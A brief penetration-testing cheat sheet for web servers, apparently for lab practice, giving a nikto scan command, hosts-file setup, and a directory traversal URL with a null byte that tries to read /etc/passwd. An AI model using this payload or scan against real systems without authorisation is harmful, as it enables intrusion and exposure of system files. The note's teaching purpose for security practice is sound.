## HTTP/HTTPS Pen Testing

### Enumeration
```
nikto -host thedomain.com
```
### To add ip's to your host file
Add the following to the hosts file `10.11.1.140 domainname.com`

Linux is `/etc/hosts`

Windows is `C:\windows\system32\drivers\etc\hosts`

### Directory Traversal Vulnerability
```
# To attempt to view the /etc/passwd file
http://host/index.php?page=./../../../../../etc/passwd%00
```
